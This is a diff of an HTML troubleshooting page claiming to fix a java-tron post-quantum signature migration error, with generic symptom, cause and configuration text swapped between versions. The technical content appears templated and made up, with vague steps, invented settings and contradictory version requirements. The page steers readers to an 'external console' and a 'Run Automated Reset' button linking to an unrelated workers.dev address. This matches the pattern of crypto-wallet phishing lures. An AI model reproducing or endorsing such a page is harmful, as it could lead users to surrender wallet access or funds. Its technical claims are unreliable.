@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Java Tron Feature Tron Post Quantum Signature Migration – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: system-ui;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,35 +42,33 @@
 <h1>Java Tron Feature Tron Post Quantum Signature Migration</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users may encounter issues with transaction verification and validation on the TRON network, resulting in failed transactions or inconsistent ledger states.</li>
+<li>Users encounter issues when attempting to migrate to post-quantum signatures on the TRON network using java-tron, resulting in failed transactions or errors during the migration process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the incomplete migration of post-quantum signature schemes in the Java-Tron implementation, leading to incompatibility with the latest TRON network upgrades.</li>
+<li>The error occurs due to incompatible signature schemes between the existing infrastructure and the new post-quantum signature requirements, leading to a mismatch in cryptographic protocols.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Update the Java-Tron configuration to use the latest post-quantum signature libraries.</li>
-<li>Run the <code>tron-post-quantum-migration-tool</code> to upgrade the local node's signature scheme.</li>
-<li>Modify the <code>tron.conf</code> file with the following settings:</li>
+<li>Update the java-tron protocol to the latest version supporting post-quantum signatures</li>
+<li>Configure the TRON network settings to prioritize post-quantum signature verification</li>
+<li>Implement a custom solution using the following code block:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;postQuantum&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SPHINCS&quot;</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;PostQuantum&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;verificationMode&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Strict&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments.</p>
+<p>Consider utilizing an external console for more advanced configuration options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Java-Tron version 4.5.0 or later</li>
-<li>TRON network node sync completion</li>
-<li>Post-quantum signature library installation</li>
+<li>TRON network node updated to the latest version</li>
+<li>Java-tron protocol version 4.0 or higher</li>
+<li>Post-quantum signature library installed and configured correctly</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
